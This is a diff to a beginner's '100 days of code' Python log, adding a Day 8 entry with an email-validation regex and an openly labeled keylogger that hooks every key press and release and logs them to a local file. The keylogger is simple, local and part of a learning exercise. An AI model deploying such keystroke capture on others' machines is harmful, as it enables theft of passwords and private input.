@@ -6,6 +6,7 @@ DAY 1
 ### Date: 2025-01-01
 ### Description: This is the first day of my 100 days of code challenge. I will begin by introducing myself and explaining the purpose of this challenge.
 ### Code: This is a simple Python script that prints out a message to the user.# My100DaysOfCode
+
 print("Hello, World!")
 print("Welcome to my 100 days of code challenge.")
 print("I'm ABDULLAHI ABDULLAHI, and I'm excited to start this journey.")
@@ -163,6 +164,7 @@ DAY 6
 ### Date: 2025-01-06
 ### Description: In this day, I will be learning about modules in Python.
 ### Code: This is a simple Python script that demonstrates the use of modules.
+
 import math
 import random
 import datetime
@@ -262,3 +264,76 @@ def game():
 
 game()
 
+DAY 8
+===============================
+### Author: ABDULLAHI AHMED OSMAN
+### Date: 2025-01-08
+### Description: This is the eighth day of the 100 Days of Code challenge.
+### The task is to create a program that can verify email address and Key Logger
+
+import re
+
+def verify_email(email):
+    """
+    Verifies if the given email address is valid.
+    
+    Args:
+        email (str): The email address to verify.
+    
+    Returns:
+        bool: True if the email address is valid, False otherwise.
+    """
+    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$"
+    if re.match(email_regex, email):
+        return True
+    else:
+        return False
+
+def main():
+    # Test the verify_email function
+    emails = ["test@example.com", "test.example.com", "test@.com"]
+    for email in emails:
+        print(f"Email: {email}, Valid: {verify_email(email)}")
+
+if __name__ == "__main__":
+    main()
+
+# Output:
+# Email: test@example.com, Valid: True
+# Email: test.example.com, Valid: False
+# Email: test@.com, Valid: False
+
+import keyboard
+import time
+import threading
+import logging
+import datetime
+import os
+import platform
+
+# Set up logging
+logging.basicConfig(filename='key_log.txt', level=logging.INFO, format='%(asctime)s: %(message)s')
+
+def on_key_press(event):
+    logging.info(f'Key pressed: {event.name}')
+
+def on_key_release(event):
+    logging.info(f'Key released: {event.name}')
+
+def main():
+    try:
+        keyboard.on_press(on_key_press)
+        keyboard.on_release(on_key_release)
+
+        # Keep the program running until manually stopped
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print('Program stopped manually')
+    except Exception as e:
+        print(f'An error occurred: {e}')
+    finally:
+        keyboard.unhook_all()
+
+if __name__ == "__main__":
+    main()
